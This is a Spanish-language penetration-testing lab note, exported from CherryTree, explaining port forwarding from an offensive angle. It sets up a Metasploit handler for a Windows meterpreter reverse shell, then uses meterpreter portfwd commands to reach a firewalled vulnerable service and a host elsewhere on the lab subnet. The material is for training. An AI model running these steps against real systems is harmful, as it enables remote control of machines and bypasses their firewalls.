<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Port-Forwarding</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Port-Forwarding</h1><br/><p><strong><h1>¿Qué es y en que consiste?</h1></strong></p><p></p><p></p><p>Es algo que no es específico de seguridad, es algo propio de la administración de sistemas de red.</p><p></p><p>Se trata de hacer que la conexión de un puerto a una máquina concreta se redirija al puerto de otra máquina, por ejemplo; una conexión desde internet a un puerto de nuestro router y redireccionarla al puerto de una máquina concreta a ese puerto dentro de la subred.</p><p></p><p>Aquí vamos a utilizarlo desde el punto de vista ofensivo.</p><p></p><p>Haciendo uso del payload creado con C# vamos a abrir Metasploit:</p><p></p><p><div class="codebox"><pre><br />masfconsole<br />use exploit<span style="color:#000000;font-weight:700">/</span>multi<span style="color:#000000;font-weight:700">/</span>handler<br /><span style="color:#000000;font-weight:700">set</span> payload windows<span style="color:#000000;font-weight:700">/</span>meterpreter<span style="color:#000000;font-weight:700">/</span>reverse_tcp<br /><span style="color:#000000;font-weight:700">set</span> lhost 192.168.20.129<br /><span style="color:#000000;font-weight:700">set</span> lport 5555<br /></pre></div></p><p></p><p><img src="images/67-1.png" alt="images/67-1.png" /></p><p></p><p></p><p><h2>El caso de uso para el que vamos a utilizar un Port-Forwarding</h2>:</p><p></p><p>Imaginad el caso de que en la máquina objetivo donde tenemos el meterpreter sabemos que tienen un servicio vulnerable pero ese servicio tiene limitaciones por un firewall local por lo que una conexión reversa se permitiría pero una conexión entrante hacia un servicio desde fuera sería bloqueada.</p><p></p><p>Lo que vamos a hacer es emular que estamos corriendo un servicio utilizando Netcat en windows.</p><p></p><p><a href="https://nmap.org/ncat/">https://nmap.org/ncat/</a></p><p></p><p>En nuestra máquina windows vemos que si lo ponemos a escuchar en cualquier puerto nos saltará el firewall de windows.</p><p></p><p><img src="images/67-2.png" alt="images/67-2.png" /></p><p></p><p>Esto es lo más normal en cualquier equipo. El firewall local de la máquina bloquea todas las conexiones entrantes.</p><p></p><p>Lo cancelamos.</p><p></p><p>La situación es:</p><p>Hemos obtenido un meterpreter y hacemos un análisis de los servicios expuesto hemos encontrado que el puerto 23 hay un servicio vulnerable que podemos explotar de forma remota pero no podemos acceder porque el firewall de la máquina está bloqueando las conexiones.</p><p></p><p>Con el meterpreter vamos a añadir un port-forwarding que va a estar escuchando en la máquina kali en un puerto que la máquina windows si permite conexiones entrantes que podemos descubrir con un escaneo de red.</p><p></p><p><img src="images/67-3.png" alt="images/67-3.png" /></p><p></p><p>Estos puertos son normales y obligatorios para el funcionamiento de la máquina.</p><p></p><p>Le indicamos pues a meterpreter:</p><p></p><p><div class="codebox"><pre><br />portfwd add -l 135 -p 23<br /></pre></div></p><p></p><p>Le mandamos el tráfico de red a esa máquina por el 135 pero cuando llegue lo va a redirigir al puerto 23</p><p></p><p><img src="images/67-4.png" alt="images/67-4.png" /></p><p></p><p><img src="images/67-5.png" alt="images/67-5.png" /></p><p></p><p></p><p>Ahora en otra terminal nos conectamos al puerto 135 de forma local en kali:</p><p></p><p><div class="codebox"><pre><br />netcat 127.0.0.1 135</pre></div></p><p></p><p><img src="images/67-6.png" alt="images/67-6.png" /></p><p></p><p><img src="images/67-7.png" alt="images/67-7.png" /></p><p></p><p></p><p>También podemos acceder al servicio de otra máquina en la misma subred o dominio que solo ofrezca ese servicio para la subred o máquinas confiadas.</p><p></p><p><div class="codebox"><pre><br />portfwd delete -i 1</pre></div></p><p></p><p>Eliminamos el anterior relay.</p><p></p><p><div class="codebox"><pre><br />portfwd add -l 135 -p 80 -r 192.168.20.133</pre></div></p><p></p><p>Apuntamos al puerto 80 de la WS01.</p><p></p><p>Ahora lo que ocurre es reenviar el paquete local al puerto 135 de Meterpreter en kali, este lo reenvía al puerto 135 a WS02 y esta reenvía el paquete al puerto 80 de WS01. </p><p></p><p><a href="https://www.ssh.com/academy/ssh/tunneling-example">https://www.ssh.com/academy/ssh/tunneling-example</a></p><p></p></div>
</body>
</html>
